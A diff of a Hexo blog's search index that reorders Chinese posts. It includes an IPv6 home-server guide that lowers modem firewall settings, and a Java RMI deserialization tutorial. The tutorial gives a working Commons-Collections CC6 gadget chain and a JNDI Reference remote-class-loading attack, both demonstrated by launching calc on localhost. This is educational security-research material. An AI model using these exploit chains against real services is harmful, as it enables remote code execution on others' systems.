@@ -1,57 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>利用ipv6实现公网ip</title>
-    <url>/post/Using-ipv6-to-realize-public-ip/</url>
-    <content><![CDATA[<h3 id="背景"><strong>背景</strong></h3>
-<p>之前很羡慕别人能够有属于自己的个人博客，自己也想拥有，搭建个人博客首先就要有一台个人服务器，要搭建个人服务器得先有公网ip，然而目前公网IPv4资源紧缺，部分运营商是不会随意将公网ip提供给个人的，这就有些难受了</p>
-<h3 id="偶然发现的ipv6">偶然发现的ipv6</h3>
-<p>今天在网上冲浪的时候，突然看到一篇文章，文章中提到“十四五”期间IPv6规模部署任务和目标——2025年底县级以上政府网站完成率达到95%以上。说明在不久的未来，ipv6将替代ipv4成为主流，在查询了相关资料以后，发现目前大多数网络设备都是支持ipv6的，并且由于ipv6非常广泛，不需要使用nat去区分内外网，电脑上获取到的ipv6可以直接在公网上访问。</p>
-<p>首先我们判断自己的网络有没有ipv6，直接在命令窗口中输入ipconfig</p>
-<p><img src="94b2609b808a47a4b1fca29348ee2fbd.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>如果出现ipv6地址，并且开头不是fe80，那么此时你就已经获取到了一个公网ipv6地址了，如果没有，那么请打开路由器配置网页，一般直接在浏览器中输入网关ip就可以了，登录账号以后，打开路由器的ipv6功能，这里用的是小米的路由器，其他的路由器大家可以自行搜索如何开启ipv6</p>
-<p><img src="e8ddb9e100f6459f80167b587437493e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>在打开ipv6功能以后再次输入ipconfig查看是否获取到ipv6的地址，也可以通过访问<a href="https://test-ipv6.cz/">ipv6测试</a>来看自己是否开启ipv6功能</p>
-<p><img src="90a5f83540324f2ba1e37e7ab2d3eecb.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>到这里路由器的相关配置已经结束了，但我们还是无法在公网中访问到ipv6，这是因为营业商的光猫中对ipv6进行了保护，禁止外网访问我们的ipv6地址，所以我们要对光猫进行配置，电脑浏览器访问<strong>192.168.1.1</strong>，这里要输入<strong>超级管理员</strong>的账号和密码登录才能使用高级功能，而如何获取超级管理员的账号和密码大家可以自行搜索，这里以电信为例登录</p>
-<p><img src="e6a298d939e541fca638091df69c9684.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>在安全——防火墙中将<strong>防火墙等级改到低</strong>并<strong>关闭启用ipv6 session,</strong><img src="a5d7186e39f74d7a9baa696511fa37c6.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>在网络设置中选择<strong>INTERNET</strong>连接并选择<strong>ipv4&amp;ipv6</strong></p>
-<p><img src="6344513f13b34277a0434f66a646c53e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>ipv6配置</p>
-<p><img src="f4b7d550a2b94c5c94c425dc6ab17a6d.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>在状态——网络侧信息中查看ipv6的地址如下图所示则说明配置成功</p>
-<p><img src="8cfc7f2b86694cfa9331934731a67947.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>到这里光猫的配置就结束了</p>
-<p>然后我们开始测试，这里使用phpstudy开启apache的80服务</p>
-<p><img src="9c840e9af29a4e4081d456914c3a81b4.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>设置防火墙的入站规则，开启80端口</p>
-<p><img src="ff9df8fe5ba94650bec4896185801fba.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>通过<a href="https://www.itdog.cn/tcping_ipv6/">IPV6版_在线tcping_tcp延迟测试_持续ping_禁ping_tcping_端口延迟测试</a></p>
-<p>对自己的ipv6进行测试</p>
-<p>全都响应了就说明ipv6公网配置成功了<img src="7b8b9bf942eb4b1b9e0fcbc93b01d571.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>到这里我们就成功获得了一个能在公网访问的ipv6地址，可以在相关的端口配置服务</p>
-<p>（记得之前三大营业商为了防止服务器满天飞而产生的监管困难，将ipv6的80、443、8080等常见端口给封锁了，但刚才测试了说明ipv6的80端口是可用的，大家有时间可以试试其他的端口）</p>
-<h3 id="一些小缺陷">一些小缺陷</h3>
-<p>1.目前暴露在公网的ipv6并不是所有人都可以访问的，只有自己的设备开启了ipv6功能上网才可以访问（一般手机使用移动数据连接是可以访问ipv6的，如果是连接wifi的话需要配置路由器开启ipv6功能）大家可以访问<a href="https://ipw.cn/ipv6/">IPv6地址查询 | IP查询(ipw.cn)</a>进行测试自己的设备是否能访问ipv6</p>
-<p>2.当前电脑使用的ipv6地址是临时ipv6地址,每一次重启电脑或者重新联网临时ipv6地址都会刷新</p>
-<p>（可以在命令窗口中输入 <strong>netsh interface IPv6 set privacy state=disable</strong> 关闭）</p>
-<h3 id="接下来的目标">接下来的目标</h3>
-<p>1.购买域名，通过域名访问公网ipv6</p>
-<p>2.在linux系统中配置ipv6公网地址</p>
-<h3 id="大佬的文章">大佬的文章</h3>
-<p><a href="https://blog.csdn.net/Cypher_X/article/details/123010419">天降公网ip | 你也许已经有公网IP了_Wuuconix的博客-CSDN博客_wsl 公网ip</a></p>
-<p><a href="https://cloud.tencent.com/developer/article/2067426">IPv6 实用教程 - 腾讯云开发者社区-腾讯云</a></p>
-<p><a href="https://www.xiaoxinys.cn/105885.html">如何搭建ipv6服务器，服务器端搭建DDNS服务的方法-小新网</a></p>
-]]></content>
-      <categories>
-        <category>技术</category>
-      </categories>
-      <tags>
-        <tag>ipv6</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>XXE漏洞详解</title>
     <url>/post/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</url>
     <content><![CDATA[<h1 id="简介">简介</h1>
@@ -131,6 +80,63 @@
       <tags>
         <tag>xxe</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>利用ipv6实现公网ip</title>
+    <url>/post/Using-ipv6-to-realize-public-ip/</url>
+    <content><![CDATA[<h3 id="背景"><strong>背景</strong></h3>
+<p>之前很羡慕别人能够有属于自己的个人博客，自己也想拥有，搭建个人博客首先就要有一台个人服务器，要搭建个人服务器得先有公网ip，然而目前公网IPv4资源紧缺，部分运营商是不会随意将公网ip提供给个人的，这就有些难受了</p>
+<h3 id="偶然发现的ipv6">偶然发现的ipv6</h3>
+<p>今天在网上冲浪的时候，突然看到一篇文章，文章中提到“十四五”期间IPv6规模部署任务和目标——2025年底县级以上政府网站完成率达到95%以上。说明在不久的未来，ipv6将替代ipv4成为主流，在查询了相关资料以后，发现目前大多数网络设备都是支持ipv6的，并且由于ipv6非常广泛，不需要使用nat去区分内外网，电脑上获取到的ipv6可以直接在公网上访问。</p>
+<p>首先我们判断自己的网络有没有ipv6，直接在命令窗口中输入ipconfig</p>
+<p><img src="94b2609b808a47a4b1fca29348ee2fbd.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>如果出现ipv6地址，并且开头不是fe80，那么此时你就已经获取到了一个公网ipv6地址了，如果没有，那么请打开路由器配置网页，一般直接在浏览器中输入网关ip就可以了，登录账号以后，打开路由器的ipv6功能，这里用的是小米的路由器，其他的路由器大家可以自行搜索如何开启ipv6</p>
+<p><img src="e8ddb9e100f6459f80167b587437493e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>在打开ipv6功能以后再次输入ipconfig查看是否获取到ipv6的地址，也可以通过访问<a href="https://test-ipv6.cz/">ipv6测试</a>来看自己是否开启ipv6功能</p>
+<p><img src="90a5f83540324f2ba1e37e7ab2d3eecb.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>到这里路由器的相关配置已经结束了，但我们还是无法在公网中访问到ipv6，这是因为营业商的光猫中对ipv6进行了保护，禁止外网访问我们的ipv6地址，所以我们要对光猫进行配置，电脑浏览器访问<strong>192.168.1.1</strong>，这里要输入<strong>超级管理员</strong>的账号和密码登录才能使用高级功能，而如何获取超级管理员的账号和密码大家可以自行搜索，这里以电信为例登录</p>
+<p><img src="e6a298d939e541fca638091df69c9684.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>在安全——防火墙中将<strong>防火墙等级改到低</strong>并<strong>关闭启用ipv6 session,</strong><img src="a5d7186e39f74d7a9baa696511fa37c6.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>在网络设置中选择<strong>INTERNET</strong>连接并选择<strong>ipv4&amp;ipv6</strong></p>
+<p><img src="6344513f13b34277a0434f66a646c53e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>ipv6配置</p>
+<p><img src="f4b7d550a2b94c5c94c425dc6ab17a6d.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>在状态——网络侧信息中查看ipv6的地址如下图所示则说明配置成功</p>
+<p><img src="8cfc7f2b86694cfa9331934731a67947.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>到这里光猫的配置就结束了</p>
+<p>然后我们开始测试，这里使用phpstudy开启apache的80服务</p>
+<p><img src="9c840e9af29a4e4081d456914c3a81b4.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>设置防火墙的入站规则，开启80端口</p>
+<p><img src="ff9df8fe5ba94650bec4896185801fba.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>通过<a href="https://www.itdog.cn/tcping_ipv6/">IPV6版_在线tcping_tcp延迟测试_持续ping_禁ping_tcping_端口延迟测试</a></p>
+<p>对自己的ipv6进行测试</p>
+<p>全都响应了就说明ipv6公网配置成功了<img src="7b8b9bf942eb4b1b9e0fcbc93b01d571.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>到这里我们就成功获得了一个能在公网访问的ipv6地址，可以在相关的端口配置服务</p>
+<p>（记得之前三大营业商为了防止服务器满天飞而产生的监管困难，将ipv6的80、443、8080等常见端口给封锁了，但刚才测试了说明ipv6的80端口是可用的，大家有时间可以试试其他的端口）</p>
+<h3 id="一些小缺陷">一些小缺陷</h3>
+<p>1.目前暴露在公网的ipv6并不是所有人都可以访问的，只有自己的设备开启了ipv6功能上网才可以访问（一般手机使用移动数据连接是可以访问ipv6的，如果是连接wifi的话需要配置路由器开启ipv6功能）大家可以访问<a href="https://ipw.cn/ipv6/">IPv6地址查询 | IP查询(ipw.cn)</a>进行测试自己的设备是否能访问ipv6</p>
+<p>2.当前电脑使用的ipv6地址是临时ipv6地址,每一次重启电脑或者重新联网临时ipv6地址都会刷新</p>
+<p>（可以在命令窗口中输入 <strong>netsh interface IPv6 set privacy state=disable</strong> 关闭）</p>
+<h3 id="接下来的目标">接下来的目标</h3>
+<p>1.购买域名，通过域名访问公网ipv6</p>
+<p>2.在linux系统中配置ipv6公网地址</p>
+<h3 id="大佬的文章">大佬的文章</h3>
+<p><a href="https://blog.csdn.net/Cypher_X/article/details/123010419">天降公网ip | 你也许已经有公网IP了_Wuuconix的博客-CSDN博客_wsl 公网ip</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/2067426">IPv6 实用教程 - 腾讯云开发者社区-腾讯云</a></p>
+<p><a href="https://www.xiaoxinys.cn/105885.html">如何搭建ipv6服务器，服务器端搭建DDNS服务的方法-小新网</a></p>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>ipv6</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>新年好</title>
+    <url>/post/happy-new-year/</url>
+    <content><![CDATA[<p>欢迎来到1y0ng的blog,今天是2023年的第一天，祝大家新年快乐</p>
+]]></content>
   </entry>
   <entry>
     <title>agent内存马学习</title>
@@ -216,12 +222,6 @@
       </tags>
   </entry>
   <entry>
-    <title>新年好</title>
-    <url>/post/happy-new-year/</url>
-    <content><![CDATA[<p>欢迎来到1y0ng的blog,今天是2023年的第一天，祝大家新年快乐</p>
-]]></content>
-  </entry>
-  <entry>
     <title>Hello World</title>
     <url>/post/hello-world/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
@@ -239,64 +239,6 @@
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>java反序列化之RMI</title>
-    <url>/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/</url>
-    <content><![CDATA[<h1 id="RMI">RMI</h1>
-<p><code>RMI（Remote Method Invocation）</code>是Java中用于实现<code>远程方法调用</code>的机制,它允许在不同的JVM之间传递和执行Java对象的方法调用。</p>
-<p>下面是一个简单的RMI示例代码：</p>
-<p>Server端代码：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">NeedOb</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;<span class="comment">//创建远程对象接口,这里要继承Remote</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayhello</span> <span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NeedObject</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">NeedOb</span>&#123;<span class="comment">//接口实现类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">NeedObject</span><span class="params">()</span> <span class="keyword">throws</span>  RemoteException&#123;&#125;;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayhello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">NeedObject</span> <span class="variable">needObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NeedObject</span>();<span class="comment">//初始化远程对象（在这里其实就可以使用了,只不过不知道端口号）</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;needObject&quot;</span>,needObject);<span class="comment">//绑定needObject对象</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>Client端代码：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">NeedOb</span> <span class="variable">needObject2</span> <span class="operator">=</span> (NeedOb) registry.lookup(<span class="string">&quot;needObject&quot;</span>);</span><br><span class="line">        System.out.println(needObject2.sayhello());<span class="comment">//调用sayhello方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>结果输出：</p>
-<p><img src="image-20230328170900218.png" alt="image-20230328170900218"></p>
-<p>通讯过程：</p>
-<ol>
-<li>客户端通过lookup()方法查找远程对象的引用。这个过程需要指定要查找的远程对象的URL地址（包括主机名、注册表名称和对象名称）。</li>
-<li>客户端调用远程对象的方法。这个过程和调用本地对象的方法类似,客户端并不知道这个对象在运行时是否在本地,也不知道对象实现的细节。</li>
-<li>客户端请求经过网络传输到服务端。这个过程涉及到数据的编码和解码,通过<code>Java序列化机制</code>将对象转换成字节数组进行传输。</li>
-<li>服务端收到请求,根据请求参数调用相应的方法,并将结果返回给客户端。这个过程同样需要涉及数据的编码和解码。</li>
-<li>服务端的响应经过网络传输到客户端,客户端接收响应并将返回值转换成本地对象。</li>
-</ol>
-<h1 id="序列化利用">序列化利用</h1>
-<p>仅通过上述代码是很难进行利用的,但我们从传输的过程可以发现客户端在调用远程对象方法的时候,传输的参数有一个<code>先在客户端序列化,然后在服务端反序列化</code>的过程,所以我们就可以利用这个过程实现反序列化的利用,这里以CC6为例。</p>
-<p>条件：远程调用方法允许传入<code>Object对象</code>&amp;服务端<code>有commons-collections的依赖</code></p>
-<p>我们首先把sayhello方法修改成可传入Object对象</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NeedObject</span>  <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">NeedOb</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">NeedObject</span><span class="params">()</span> <span class="keyword">throws</span>  RemoteException&#123;&#125;;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayhello</span><span class="params">(Object object)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>在服务端添加commons-collections依赖</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>客户端修改poc：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,<span class="string">&quot;13&quot;</span>);</span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(tiedMapEntry,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">hashMap.remove(<span class="string">&quot;13&quot;</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> tiedMapEntry.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">mapfield</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">mapfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">mapfield.set(tiedMapEntry,lazymap);</span><br><span class="line"></span><br><span class="line"><span class="comment">//以上是cc6的利用链生成</span></span><br><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line"><span class="type">NeedOb</span> <span class="variable">needObject</span> <span class="operator">=</span> (NeedOb) registry.lookup(<span class="string">&quot;needObject&quot;</span>);</span><br><span class="line">needObject.sayhello(hashMap);<span class="comment">//传入反序列化对象</span></span><br></pre></td></tr></table></figure>
-<p>命令执行成功！！！</p>
-<p><img src="image-20230328194847154.png" alt="image-20230328194847154"></p>
-<h1 id="RMI-JNDI">RMI+JNDI</h1>
-<p>JNDI（Java 命名和目录接口）是 Java 平台提供的一组 API,用于查找和访问命名和目录服务。它可以让 Java  应用程序在运行时动态地查找和使用各种资源,如数据库连接、邮件服务器、JMS 消息队列等。通过 JNDI,Java  应用程序可以在不同的环境中进行配置和部署,而无需修改代码。</p>
-<p><img src="image-20230329202416845.png" alt="image-20230329202416845"></p>
-<p>JNDI支持很多协议,其中就包括RMI协议</p>
-<p>以下是一段利用jndi调用远程对象的客户端实例代码：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();<span class="comment">//创建JNDI上下文</span></span><br><span class="line"><span class="type">NeedOb</span> <span class="variable">needObject</span> <span class="operator">=</span> (NeedOb) context.lookup(<span class="string">&quot;rmi://localhost:1099/needObject&quot;</span>);</span><br><span class="line">context.lookup(<span class="string">&quot;rmi://localhost:1099/needObject&quot;</span>);</span><br><span class="line">System.out.println(needObject.sayhello(<span class="string">&quot;111&quot;</span>));</span><br></pre></td></tr></table></figure>
-<p>运行后将会直接调用远程对象的sayhello方法</p>
-<p>之前我们是利用客户端去攻击服务端,而RMI+JNDI可以利用服务端去攻击客户端,当客户端lookup里的参数可控时,我们构造以下服务端代码来执行任意命令：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Test&quot;</span>,<span class="string">&quot;Test&quot;</span>,<span class="string">&quot;http://127.0.0.1:7777/&quot;</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;needObject&quot;</span>,wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>对应的Test类：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>先启动服务程序,然后在Test.class文件位置用<code>python -m http.server 7777</code>在本地7777端口开一个http服务</p>
-<p>启动客户端发现命令被执行</p>
-<p><img src="image-20230329205341513.png" alt="image-20230329205341513"></p>
-<p>这段代码的重点在于Reference reference  = new Reference(“Test”,“Test”,“<a href="http://127.0.0.1:7777/">http://127.0.0.1:7777/</a>”);</p>
-<p>在Java的JNDI（Java命名和目录接口）中,Reference类用于表示对远程或本地资源的引用,例如Web服务、JDBC数据源等。Reference对象通常包含了一些元数据信息,如引用类型、名称、位置、认证信息等。</p>
-<p>Reference(String className, String factoryClassName, String location)是Reference类的一个构造方法,传入的三个参数分别为类名、工厂类名、URL地址</p>
-<p>因为<code>Reference</code>没有实现<code>Remote</code>接口也没有继承<code>UnicastRemoteObject</code>类,故不能作为远程对象bind到注册中心,所以需要使用<code>ReferenceWrapper</code>对<code>Reference</code>的实例进行一个封装。</p>
-<p>当客户端运行代码的时候会去http://127.0.0.1:7777寻找Test类同时调用其构造方法,于是就触发了构造方法中的命令</p>
-]]></content>
-      <categories>
-        <category>JAVA</category>
-      </categories>
-      <tags>
-        <tag>反序列化</tag>
-      </tags>
   </entry>
   <entry>
     <title>java反序列化之DNSURL和CommonsCollections</title>
@@ -435,6 +377,166 @@ URL.hashCode()-&gt;handler.hashCode()-&gt;getHostAddress()</p>
       </tags>
   </entry>
   <entry>
+    <title>java反序列化之RMI</title>
+    <url>/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/</url>
+    <content><![CDATA[<h1 id="RMI">RMI</h1>
+<p><code>RMI（Remote Method Invocation）</code>是Java中用于实现<code>远程方法调用</code>的机制,它允许在不同的JVM之间传递和执行Java对象的方法调用。</p>
+<p>下面是一个简单的RMI示例代码：</p>
+<p>Server端代码：</p>
